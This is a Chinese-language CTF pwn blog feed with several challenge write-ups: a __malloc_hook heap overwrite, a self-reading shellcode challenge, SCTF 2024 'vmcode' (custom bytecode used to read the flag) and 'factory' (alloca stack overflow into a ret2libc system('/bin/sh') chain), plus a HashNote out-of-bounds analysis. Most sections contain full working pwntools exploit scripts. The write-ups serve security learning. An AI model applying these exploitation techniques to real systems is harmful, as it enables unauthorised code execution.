to free, 3 to show, 4 to edit, 0 to exit:&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter index to show:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size, con</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter 1 to add, 2 to free, 3 to show, 4 to edit, 0 to exit:&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter index to edit:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input size&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input&quot;</span>,con)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0xd41</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd50</span>)<span class="comment">#1</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xc10</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Chunk at index 2: &quot;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ec2a0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">ogg=libc_base+<span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0xd60</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0xd58</span>+p64(<span class="number">0x2a1</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0xd68</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0xd58</span>+p64(<span class="number">0x281</span>)+p64(malloc_hook))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x270</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x270</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,p64(ogg))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><p>这次比赛有两个还算没有解决的问题吧，，一个是那道ai题还是有点疑问的。</p>
<p>另一个就是这道题没有公布wp，并且在题目中会去检查一次你任意地址写的时候写在哪里，如果这个地址不满足什么什么条件那么就会输出不允许改hook然后退出程序</p>
<p>然而实际上我们最后的利用还是改hook而已</p>
<p>不是很懂出题人的意思</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>学习日志</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>省赛小记</title>
    <url>/2024/11/04/%E7%9C%81%E8%B5%9B%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>O.o</p>
<p>遗憾下播，会做一道，但是比赛的时候脑子抽风了，索性队伍不差我这100分所以没有难过到自责的地步。</p>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>受到之前做的题目影响有点大，，看到禁了syscall然后open,read过下意识以为侧信道相关</p>
<p>不过没开沙箱，实际上利用手段非常多，0xa也比上次侧信道的0x6要多很多字节，最后半个小时想过换方法不过可能最近状态不好，最后0解下播。</p>
<p>实际上是栈上脏数据reread,第二天重打还是挺快就通了的</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./shellcode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;139.155.126.78&quot;,38696)</span></span><br><span class="line">p= process(elf_path)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	pop rax</span></span><br><span class="line"><span class="string">	pop rdx</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	pop rsi</span></span><br><span class="line"><span class="string">	sub rax,0x41</span></span><br><span class="line"><span class="string">	call rax</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>) <span class="comment"># 第二次分配内存会在之前的上面加上0xa，但是写入还是从上次开始写，所以随便填个0xa的内存就行了</span></span><br><span class="line">shellcode+=asm(shellcraft.sh())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;input: &#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>后面还有两道，apple这道是高版本libc，但是洞是明显的。比赛的时候可能不太容易做出来，，或许应该抽时间深入学学io_file</p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2024SCTF pwn题全解（上）</title>
    <url>/2024/10/12/SCTF-vmcode/</url>
    <content><![CDATA[<p>_(:3 」∠ )_</p>
<h1 id="2024SCTF"><a href="#2024SCTF" class="headerlink" title="2024SCTF"></a>2024SCTF</h1><p>比赛当天挺忙的，上线很晚，当时感觉可以试试vmcode最后还是没做出来hhh,本来是只有一道字节码的，但是因为blog一直拖着不发加上有复现XCTF的想法，索性一锅端了。</p>
<h2 id="vmcode"><a href="#vmcode" class="headerlink" title="vmcode"></a>vmcode</h2><p>狠狠逆就对了；；<br>自己自定义了一套字节码指令，有一个模拟的栈，在这个虚拟的指令集里面把寄存器调整好再syscall</p>
<p>这道题的切入点在于观察syscall多调试（或者肉眼瞪汇编。。。）</p>
<p>ida解析不出来<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241104222939.png"
                      alt="20241104222939"
                ></p>
<p>先看沙箱开的什么：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241104222854.png"
                      alt="20241104222854"
                ><br>就是只有orw</p>
<p>追到<code>BUG（）</code>的地方<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241104223420.png"
                      alt="20241104223420"
                ><br>再加上发现在内存里<code>shellcode:</code>的顺序很奇怪<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241104225241.png"
                      alt="20241104225241"
                ><br>一通瞎调看他到这里是怎么输出的</p>
<p>然后发现是把data里的东西一顿调整，压到stack这个数组里，然后再调整寄存器，然后再syscall<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241104224949.png"
                      alt="20241104224949"
                ><br>所以可以猜测 code 是代码部分，stack 是虚拟栈</p>
<h3 id="逆向时间"><a href="#逆向时间" class="headerlink" title="逆向时间"></a>逆向时间</h3><p>先要逆出来<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241105180128.png"
                      alt="20241105180128"
                ><br>这里一段大概就是前面得到 字节码 ，然后 retn 跳转执行code，<br>然后就可以去offset的地方找到对应的偏移,这里<code>rcx</code>像是offset的index,这样可以研究出字节码真正的具体数字</p>
<p>接下来就是把这套指令集对应的意思逆出来，方法大概就是 调or瞪 ：</p>
<p>大概是这样：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rbx-&gt;rbp</span><br><span class="line">rdi-&gt;rsp</span><br><span class="line">rsi-&gt;code_offset</span><br><span class="line"></span><br><span class="line"><span class="number">0x1274</span>:(push rip,ni)</span><br><span class="line"><span class="number">0x1299</span>:(ret)</span><br><span class="line"><span class="number">0x12a7</span>:(xor)</span><br><span class="line"><span class="number">0x12c4</span>:(xchg)</span><br><span class="line">	xchg [rsp],[rsp-<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">0x12e0</span>:(xchg)</span><br><span class="line">	xchg [rsp],[rsp-<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="number">0x12fc</span>:(push <span class="number">4</span> code)</span><br><span class="line"><span class="number">0x1319</span>:(movzx)</span><br><span class="line"><span class="number">0x132e</span>:(pop)</span><br><span class="line"><span class="number">0x1332</span>:(shr)</span><br><span class="line"><span class="number">0x1348</span>:(push_rsp)</span><br><span class="line"><span class="number">0x135c</span>:(shl)</span><br><span class="line"><span class="number">0x1372</span>:(jmp_138c)</span><br><span class="line"><span class="number">0x138c</span>:(ni)</span><br><span class="line"><span class="number">0x13a3</span>:(ror)</span><br><span class="line"></span><br><span class="line"><span class="number">0x13c0</span>:(rol)</span><br><span class="line">	pop rax</span><br><span class="line">	rol rax,[rax-<span class="number">8</span>]</span><br><span class="line">	push rax</span><br><span class="line"></span><br><span class="line"><span class="number">0x13dd</span>:(add)</span><br><span class="line">	pop rax</span><br><span class="line">	<span class="keyword">and</span> [rax],[rax-<span class="number">8</span>]</span><br><span class="line">	push rax</span><br><span class="line"></span><br><span class="line"><span class="number">0x13fa</span>:(syscall)<span class="comment"># 这里描述了一下syscall时的栈上的布局</span></span><br><span class="line">	index --stack--</span><br><span class="line">rbx-&gt;	</span><br><span class="line">		rdx</span><br><span class="line">		rsi</span><br><span class="line">		rdi</span><br><span class="line">		rax</span><br><span class="line">	rdi-&gt;	</span><br><span class="line">	</span><br><span class="line">    syscall</span><br><span class="line">	</span><br><span class="line">    index --stack--</span><br><span class="line">rbx-&gt;	</span><br><span class="line">            rdx</span><br><span class="line">	rdi-&gt;	</span><br><span class="line"></span><br><span class="line"><span class="number">0x1425</span>:(push rsp)</span><br><span class="line"><span class="number">0x1439</span>:(push rip)</span><br></pre></td></tr></table></figure></div>
<p>虽然和code相关的部分有点难逆，但是还好，其实只需要调整栈然后syscall，所以其实有些地方无所谓</p>
<h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><p>直接把指令码输进去就好 有的是带参数的就跟在后面 指令会自己读code<br>在write()这里调了一下看了眼栈找了找rdi的位置<br>（此时syscall完全结束，rdi&#x3D;9）<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241105172958.png"
                      alt="20241105172958"
                ></p>
<p>这里exp的函数直接使用了<a class="link"   href="https://www.bilibili.com/read/cv39270682/" >这位师傅 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的exp<br>这道题的复现很多地方也参照了他的<br>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&quot;&quot;.)</span></span><br><span class="line">p= process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_offset</span>(<span class="params">off</span>):</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x21</span>)+p16(off)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">retn</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x22</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x23</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_8_18</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_8_10</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x25</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_4_byte</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x26</span>)+p32(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte_2_8byte</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x27</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x28</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr8</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x29</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copy_and_push</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x2a</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl8</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x2b</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jump_off_if_zero</span>(<span class="params">off</span>):</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x2c</span>)+p16(off)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x2d</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x2e</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_0_1</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x2f</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">syscall</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x30</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_rsp</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x31</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_rip</span>():</span><br><span class="line">    <span class="keyword">return</span> p8(<span class="number">0x32</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;shellcode: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x67616c66</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open(2,&#x27;flag&#x27;,0)</span></span><br><span class="line">payload = push_4_byte(flag)</span><br><span class="line">payload += push_rsp()</span><br><span class="line">payload += push_4_byte(<span class="number">0</span>)</span><br><span class="line">payload += swap_8_10()</span><br><span class="line">payload += push_4_byte(<span class="number">2</span>)</span><br><span class="line">payload += syscall()</span><br><span class="line"></span><br><span class="line"><span class="comment">#抬高栈</span></span><br><span class="line">payload += push_rsp()</span><br><span class="line">payload += copy_and_push()+copy_and_push()+copy_and_push()+copy_and_push()+copy_and_push()</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0,fd=3,buf,0x30)</span></span><br><span class="line">payload += copy_and_push()</span><br><span class="line">payload += push_4_byte(<span class="number">0x30</span>)</span><br><span class="line">payload += swap_8_10()</span><br><span class="line">payload += push_4_byte(<span class="number">3</span>)</span><br><span class="line">payload += push_4_byte(<span class="number">0</span>)</span><br><span class="line">payload += syscall()</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(1,1,rsp,0x30)</span></span><br><span class="line">payload += pop()</span><br><span class="line">payload += copy_and_push()</span><br><span class="line">payload += push_4_byte(<span class="number">0x30</span>)</span><br><span class="line">payload += swap_8_10()</span><br><span class="line">payload += push_4_byte(<span class="number">1</span>)</span><br><span class="line">payload += push_4_byte(<span class="number">1</span>)</span><br><span class="line">payload += syscall()</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h2><p>看的时候看到一个可疑的函数<code>alloca</code><br>查询网络得知：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入的 num 用做 alloca 的参数 alloca(num)</span><br><span class="line">alloca 是从调用者的栈上分配内存，相当于 sub esp, eax</span><br></pre></td></tr></table></figure></div>
<p>所以这里是向上抬栈，然而反汇编的时候这个num的算法还是有比较明显的问题，大概是分配不够的。</p>
<p>本着分析不出来就开调的原则，尝试几个数观察抬栈高度以及写入数据的位置，基本可以得到：<br>原本栈空间为0x30，alloca后向上扩大，在扩大的地方写入数据，数据类型占用0x08，rbp+0x30的地方记录着i</p>
<p>那么就可以改i,我一开始为了看懂程序试的数都比较保守，看懂了之后直接选择最大的数打爆这个栈（<br>开调！<br>稍微要注意的就是在塞完rop之后有多余的输入机会，需要在这里注意一下，不过提前一次输入时停一下调试几步基本也很快可以搞定。</p>
<p>其实还是嗯调比较合理，能够直观的看到栈上的变化</p>
<p>再打的时候有时候脚本会自己不通，停在发送puts_got的地方，我猜是因为puts的实际地址超过了原来的程序做的一些限制或者是有负溢出，多滚几遍就通了。</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./factory&#x27;</span></span><br><span class="line">libc_path=<span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p=remote(&quot;&quot;.)</span></span><br><span class="line">p= process(elf_path)</span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">libc=ELF(libc_path)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401563</span></span><br><span class="line">ret_addr = <span class="number">0x40148E</span></span><br><span class="line">bin_sh = <span class="number">0x1b45bd</span></span><br><span class="line">main_addr = <span class="number">0x040148F</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;How many factorys do you want to build: &#x27;</span>,<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Each factory can produce 1 ton of parts per person per year. Please allocate the number of employees to each factory.&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x15</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27; = &#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27; = &#x27;</span>,<span class="string">b&#x27;28&#x27;</span>) <span class="comment">#22</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; = &quot;</span>,<span class="built_in">str</span>(pop_rdi)) <span class="comment">#23</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; = &quot;</span>,<span class="built_in">str</span>(puts_got)) <span class="comment">#30	</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; = &quot;</span>,<span class="built_in">str</span>(puts_plt)) <span class="comment">#31</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; = &quot;</span>,<span class="built_in">str</span>(main_addr)) <span class="comment">#32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27; = &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base=&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+bin_sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;How many factorys do you want to build: &#x27;</span>,<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Each factory can produce 1 ton of parts per person per year. Please allocate the number of employees to each factory.&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x15</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27; = &#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27; = &#x27;</span>,<span class="string">b&#x27;28&#x27;</span>) <span class="comment">#22</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; = &quot;</span>,<span class="built_in">str</span>(pop_rdi)) <span class="comment">#29</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; = &quot;</span>,<span class="built_in">str</span>(bin_sh_addr)) <span class="comment">#30</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; = &quot;</span>,<span class="built_in">str</span>(ret_addr)) <span class="comment">#31</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; = &quot;</span>,<span class="built_in">str</span>(system_addr)) <span class="comment">#32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27; = &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27; = &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      <tags>
        <tag>学习日志</tag>
        <tag>Pwn</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>长城杯半决pwn——HashNote</title>
    <url>/2024/11/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3pwn%E2%80%94%E2%80%94HashNote/</url>
    <content><![CDATA[<p>(´ΘωΘ&#96;)</p>
<h2 id="HashNote"><a href="#HashNote" class="headerlink" title="HashNote"></a>HashNote</h2><p>准备国赛的时候协会web手给的题，说是春秋云境靶场里渗透出来的是。</p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>一打开就是经典无符号，然后是静态编译没有外部库。</p>
<p>虽然乍一看很恶心，但是逆过go之后看这个还是比较眉清目秀的，很容易找到主函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130204212.png"
                      alt="20241130204212"
                ></p>
<p>然后先猜输入输出函数，其中这个put后面的第一个参数都相同，点进去是.bss段上的东西，空的</p>
<p>然后 debug 的时候查看内存可以看到在main之前就已经设置好固定的值，指向一些类似<code>vtable for&#39;std::codecvt&lt;char16_t, char, __mbstate_t&gt;</code>的东西。</p>
<p>基本可以判断这个东西是c++,把这个变量标记为<code>io_puts</code>也只是为了方便之后判断带这个参数<br>的都是输出函数，<code>io_read</code>同理，因为显然这里不会逆出很直接的输入输出流，或者特定函数。</p>
<p>其实要是之前做过带符号的C++应该就比较容易理解这里一套的，可惜我只做过一半的工作，所以很多细节还是不太清楚。</p>
<p>然后有一个pwn题比较经典的登陆交互<code>check（）</code>：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130205532.png"
                      alt="20241130205532"
                ><br>但是非常好逆，甚至很多交互逻辑可以从这里辅助理解<br>得到登陆密码<code>freep@ssw0rd:3</code></p>
<p>回到 main ,还是先把一些.bss段上经常出现的地址通过一些调试知道大致意思<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130210029.png"
                      alt="20241130210029"
                ></p>
<p>这里有个一开始一直打不通的交互就是如何change username,后来看了别人的wp，大概猜了一下才懂这里的new username 要把 128 的缓冲区长度全部打满才不会卡住，可能是源程序对于 end 的设置吧。所以说，把缓冲区对齐填满是好习惯。</p>
<p>然后看子函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130210620.png"
                      alt="20241130210620"
                ><br>其实我认为这里比较重要的是reset_mem,特意把栈上的数据构造好结构拿来接收数据，关注reset部分的数据变化，可以知道存储数据的结构，和之后伪造 chunk 的结构息息相关</p>
<p>剩下的就是一通 debug 了解函数功能。大致就是每个<code>data</code>都有特定的<code>key</code>来作为索引,而这个<code>key</code>是通过给定数据算出来的一个0~126哈希，key_data是在 .bss 上的，里面存的是不同的 chunk 的地址, chunk 里存了两个东西，一个是 key ，一个是 data 。 </p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>没有libc，静态编译，自然而然想到打栈，但是要找到一个办法泄露栈地址（一般肯定是就像堆题利用show()一样利用这里的query()）</p>
<p>然后再看 getshell 的方式，从保护的角度来看没有很大的限制，rop 是比较合理的一种，不过要实现任意地址写（最起码得写到某次 return 后的栈上）</p>
<p>以及这种.bss段上全局变量特别多的题，往往就是越界写造成一些更大的突破。</p>
<p>以上差不多是我自己能分析到的程度，然后就 stuck 了，主要是利用的手法和看到的漏洞点中间总是差一口气，于是上网搜搜了搜wp(´ﾟдﾟ&#96;)</p>
<p>通过调试以及仔细阅读 F5 后的代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241130214235.png"
                      alt="20241130214235"
                ><br>漏洞点在于这里的 while ，校验如果这个哈希对应的 chunk 如果已经存在那么再看 chunk 内 key 的内容是否相同，如果不同则对于这种相同哈希不同key的情况，再往后分配一个chunk。</p>
<p>在这里没有检查index的范围，也就是说126之外的index也可以被访问到的 key_data[]之后存储的就是 username<br>insert是读，query是写，那么构造username就可以完成任意地址读写</p>
<p>接下来是泄露栈地址，主要问题是找一个记录了栈地址的地方，搜索到的wp都是在.bss段上某个地址找到的记录了一些程序加载时栈上的痕迹，可能和c++的静态编译或者和这个题目的一些设置相关，但是应该是不至于把程序逆透了才能得到。<br>（或许是通过pwndbg的search可以找到）</p>
<p>最后的工作：构造相同哈希的key<br>不会，待我请教协会密码手。否则的话就写个脚本爆一下</p>
